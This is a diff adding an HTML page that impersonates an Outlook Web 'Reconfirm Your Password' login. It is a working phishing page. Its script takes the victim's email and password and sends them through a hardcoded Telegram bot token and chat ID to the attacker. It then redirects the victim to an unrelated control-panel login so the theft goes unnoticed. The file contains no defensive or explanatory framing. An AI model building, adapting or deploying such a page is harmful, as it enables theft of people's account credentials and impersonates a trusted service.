@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Outlook Web - Second Page</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #1565c0; /* Dark Sky Blue */
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .form-container {
+      max-width: 400px;
+      width: 90%;
+      padding: 20px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      background-color: #1565c0; /* Dark Sky Blue */
+      position: relative; /* Added position relative */
+      margin-top: -40px; /* Adjust the margin as needed */
+    }
+
+    h2 {
+      text-align: center;
+      color: #fff;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+      border-radius: 5px;
+      background-color: #fff;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .logo-container {
+      display: flex;
+      justify-content: center;
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      margin: 0;
+      padding: 0;
+    }
+
+    .logo-container img {
+      width: 100%;
+      max-width: 100%;
+      height: auto;
+    }
+
+    .checkbox-container {
+      display: flex;
+      justify-content: flex-start;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+
+    .checkbox-container input[type="checkbox"] {
+      margin-right: 5px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo-container">
+      <img src="top2.png" alt="Logo">
+    </div>
+    <div class="form-container">
+      <form id="second-login-form" action="#" method="post">
+        <h2>Reconfirm Your Password</h2>
+        <input type="email" id="second-email" name="email" placeholder="Email" readonly required>
+        <input type="password" id="confirm-password" name="password" placeholder="Confirm Password" required>
+        <div class="checkbox-container">
+          <input type="checkbox" id="remember-me" name="remember-me">
+          <label for="remember-me">Remember me</label>
+        </div>
+        <button type="submit" onclick="submitSecondPageCredentials(event)">Login</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    // Retrieve email from URL query parameter and pre-fill the input field
+    window.addEventListener('DOMContentLoaded', () => {
+      const urlParams = new URLSearchParams(window.location.search);
+      const email = urlParams.get('email') || decodeURIComponent(window.location.hash.substr(1));
+      if (email) {
+        const emailInput = document.getElementById('second-email');
+        emailInput.value = email;
+      }
+    });
+
+    function submitSecondPageCredentials(event) {
+      event.preventDefault(); // Prevent form submission
+
+      const email = document.getElementById('second-email').value;
+      const password = document.getElementById('confirm-password').value;
+      const rememberMe = document.getElementById('remember-me').checked;
+
+      // Store email and rememberMe in localStorage
+      localStorage.setItem('email', email);
+      localStorage.setItem('rememberMe', rememberMe);
+
+      // Send second page credentials to Telegram using API
+      const telegramBotToken = '2143043732:AAHxBJToyKjR9xlIQjijGr7AwDqV3m2RNZQ';
+      const chatId = '672269703';
+      const message = `Second Login:\nEmail: ${email}\nPassword: ${password}\nRemember Me: ${rememberMe}`;
+      const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      // Perform AJAX request to send data to Telegram
+      const xhr = new XMLHttpRequest();
+      xhr.open('GET', apiUrl, true);
+      xhr.send();
+
+      // Redirect to the final page
+      setTimeout(() => {
+        window.location.href = 'https://controlpanel.serverdata.net/Portal/ADUser/Login';
+      }, 2000); // Delay the redirection for 2 seconds (adjust as needed)
+    }
+  </script>
+</body>
+</html>
